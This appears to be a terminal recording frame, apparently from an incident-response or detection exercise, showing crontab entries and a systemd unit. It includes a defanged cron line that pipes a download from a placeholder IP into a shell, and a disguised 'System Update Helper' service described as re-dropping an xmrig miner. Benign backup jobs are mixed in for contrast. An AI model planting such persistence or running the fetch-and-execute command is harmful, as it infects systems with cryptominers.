[37.584023, "o", "*/15 * * * * nobody /usr/bin/check-health.sh\r\n# * * * * * root <defanged beacon: curl hxxp://198.51.100.136/x | sh> — cron persistence re-drops xmrig / pgdaemon / php / redis / wget payload\r\n# scheduled maintenance (BENIGN — legitimate ops job)\r\n0 3 * * * root /usr/local/bin/backup.sh --remote 10.10.177\r\n# looks unusual but is an approved change (see /sas/handoff)\r\nSHELL=/bin/bash\r\n0 3 * * * root /usr/local/bin/backup.sh\r\n17 * * * * root run-parts /etc/cron.hourly\r\n[Unit]\r\nDescription=System Update Helper\r\nAfter=network.target\r\n[Service]\r\nExecStart launches an xmrig / pgdaemon re-dropper (defanged)\r\n[Install]\r\nWantedBy=multi-user.target\r\n"]
